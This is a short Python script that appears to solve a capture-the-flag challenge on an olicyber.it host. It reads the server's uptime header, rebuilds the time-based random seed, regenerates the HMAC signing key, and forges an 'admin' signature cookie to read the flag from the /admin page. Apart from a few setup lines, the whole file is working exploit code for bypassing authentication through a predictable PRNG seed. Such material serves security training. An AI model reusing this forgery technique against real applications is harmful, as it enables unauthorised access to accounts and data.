import requests
import time
import random
import pytz
import string
import idna
from datetime import datetime, timedelta
import pandas as pd
import hmac
import hashlib

def get_random_string(length):
  letters = string.ascii_lowercase
  result_str = ''.join(random.choice(letters) for i in range(length))
  return result_str

def sign(text, key):
  textAsBytes = bytes(text, encoding='ascii')
  keyAsBytes  = bytes(key, encoding='ascii')
  signature = hmac.new(keyAsBytes, textAsBytes, hashlib.sha256)
  return signature.hexdigest()

url = 'http://trulyrandomsignature.challs.olicyber.it/'
cookies = { 'user' : 'admin'}
resp = requests.get(url)

uptime = time.time()
timedelta = pd.Timedelta(resp.headers['X-Uptime'] + ' s')
seed = datetime.now(pytz.timezone('GMT')) - timedelta
seed = seed.strftime('%Y-%m-%d %H:%M:%S')
random.seed(seed)
cookies['signature'] = sign('admin',get_random_string(32))

resp = requests.get(url + '/admin', cookies=cookies)
print(resp.text[resp.text.find('flag{') : resp.text.find('}') + 1])